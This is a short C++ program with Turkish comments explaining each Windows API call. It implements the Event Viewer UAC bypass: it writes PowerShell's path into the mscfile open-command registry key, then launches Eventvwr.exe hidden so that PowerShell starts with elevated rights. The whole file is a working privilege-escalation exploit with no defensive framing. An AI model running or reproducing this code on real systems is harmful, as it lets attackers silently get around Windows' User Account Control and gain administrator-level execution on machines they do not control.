#include <iostream>
#include <Windows.h>
#include <tchar.h> 
#include <winreg.h>


 bool insert_key(LPCTSTR lpData) {
	LONG KeyOpen;
	LONG ValueSet;
	HKEY hKey;
	
	try {
		KeyOpen = RegOpenKeyEx( // API belirttiğimiz keyi açar.
			HKEY_CLASSES_ROOT, // bu parametre açılacak keyi belirtir.
			L"mscfile\\shell\\open\\command", // subkeyi belirtir.
			0, // hangi seçenekle açacağını belirtir.
			KEY_WRITE, // Açılacak anahtarın erişim hakkını belirtir.
			&hKey // Açılan keyin pointer'ı. kısaca adresini tutuyor.
		);
		if (KeyOpen == ERROR_SUCCESS) { // key açılmasında bir problem olmadığında;
			ValueSet = RegSetValueEx( // Açılan keydeki value değiştirmemizi sağlar.
				hKey, // Açtığımız keyin handle'i.
				NULL, // Ayarlayacağımız value nun adı. Buna gerek yok null yaparsak varsayılan olarak ayarlayacak.
				0, // Bu rezervedir ve 0 olmalı.
				REG_SZ, // Value veri tipi string olduğu için REG_SZ yazıyoruz.
				(LPBYTE)lpData, // Tutulacak veriler.
				(DWORD)((lstrlen(lpData) + 1) * 2) // Tutulan verilerin byte cinsinden boyutları.
			);
		}
		RegCloseKey(hKey); // Keyi kapattık.

		return true;
	}
	catch (const std::exception&) {
		return false;
	}
}

 int main() {
	 LPCTSTR lpData = L"C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe"; // lpData'ya path'imizi veriyoruz. 
	 if (insert_key(lpData)) {
		 MessageBox(NULL, L"Value değeri yazıldı.", L"info", MB_OK);

		 HINSTANCE shell;
		 char path[100] = "C:\\Windows\\System32\\Eventvwr.exe"; 
		 shell = ShellExecuteA( // Eventvwr.exe'yi çalıştırıyoruz. (Belirtilen dosya üzerinde işlem yapmaya yarar > ShellExecuteA)
			 NULL, // Hata mesajlarını görüntülemek için kullanılan pencerenin handle'ı. İşlem pencere ile alakalı olmadığı için NULL yapıyoruz.
			 "open", // Gerçekleşecek eylemi belirtiyoruz.
			 path, // Açılacak dosyanın yolunu veriyoruz.
			 NULL, // bu parametre eğer dosya yürütülebilir dosya ise uygulamaya geçecek parametre olarak veriyoruz. Ama gerek yok biz sadece çalışmasını istiyoruz.
			 NULL, // Çalışacağı dizine bir pointer ama gerek olmadığı için null bıraktık.
			 SW_HIDE // Uygulama çalıştığında  nasıl görüneceğini belirtiyoruz. Gizli olacak.
		 );
	 }
	 else {
		 MessageBox(NULL, L"Bir sorun oluştu", L"info", MB_OK);
	 }

	 
	return 0;
	
}

	













		


